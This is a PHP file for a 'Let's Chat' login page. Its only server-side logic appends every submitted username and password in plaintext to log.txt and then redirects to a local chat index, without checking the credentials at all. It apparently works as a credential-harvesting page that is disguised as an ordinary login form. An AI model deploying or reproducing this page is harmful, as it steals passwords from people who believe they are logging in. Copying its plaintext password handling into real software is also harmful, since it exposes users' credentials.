
<?php
if(isset($_POST['submit'])){
$my_file='log.txt';
$user = $_POST['username'];
$pwd = $_POST['password'];
$newData = $user.":".$pwd;
$handle = fopen($my_file, 'a+')or die('cannot open file:'.$my_file);
$data = fwrite($handle,$newData);
header("location:http://localhost/chat_room/index.php");
}
?>
<!DOCTYPE html>
<html >
<head>
<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src="js/index.js"></script>
<meta charset="UTF-8">
<title>Let's Chat</title>
<link rel="stylesheet" href="css/reset.css">
<link rel='stylesheet prefetch' href='http://fonts.googleapis.com/css?family=Roboto:400,100,300,500,700,900|RobotoDraft:400,100,300,500,700,900'>
<link rel='stylesheet prefetch' href='http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css'>
<link rel="stylesheet" href="css/style.css">
</head>
<body>
<div class="pen-title">
	<h1>Let's Chat</h1>
</div>
<div class="container">

	<div class="card">
		<h1 class="title">Login</h1>
		<form action="" method="POST">
			<label for="Username">Username</label>
			<input type="text" id="Username" name="username"/><br/>
			<label for="Password">Password</label>
			<input type="password" name="password" id="Password" />
			<br/><br/><br/><br/><br/><br/>
			<button type='submit' name="submit"><span>Go</span></button>
			<div class="footer"><a href="#">Forgot your password?</a></div>
		</form>
	</div>

</div>
</body>
</html>
